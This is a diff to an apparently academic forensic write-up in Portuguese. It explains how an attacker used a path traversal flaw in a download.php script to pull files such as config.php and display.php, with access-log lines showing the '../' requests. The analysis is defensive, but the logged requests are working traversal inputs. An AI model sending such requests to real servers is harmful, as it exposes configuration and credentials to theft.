@@ -236,7 +236,24 @@ Alteraçoes
 
 ### Foram realmente realizadas transferências? Se sim, como e qual o conteúdo?
 
-Sim,
+Sim foram realizadas transferências, o atacante deve ter notado que ao clicarmos no catálogo de carros, o método para descarregar ficheiros era através de um php denominado **downloads.php**, pelo que o user tentou aceder outros ficheiros através desse link e conseguiu com sucesso, visto que nao havia confinamento a nivel do diretório de downloads e ele pode voltar atras nos diretórios.
+
+```
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=Brochure.pdf HTTP/1.1" 200 13305
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=../index.php HTTP/1.1" 200 115
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=../x.txt HTTP/1.1" 200 41
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=../config.php HTTP/1.1" 200 130
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=../display.php HTTP/1.1" 200 1557
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php HTTP/1.1" 200 41
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=Brochure.pdf HTTP/1.1" 200 13305
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=../index.php HTTP/1.1" 200 115
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=../x.txt HTTP/1.1" 200 41
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=../config.php HTTP/1.1" 200 130
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=../products.php HTTP/1.1" 200 117
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=../display.php HTTP/1.1" 200 1557
+```
+Como conseguimos ver pelo log, vários ficheiros foram transferidos, incluindo ficheiros criticos de sistema como **config.php** e **display.php** que permitiram ao atacante visualizar informação **crítica** do sistema.
+
 
 ### Porque é que a Firewall externa detetou transferências mas nao detetou as restantes ações?
  
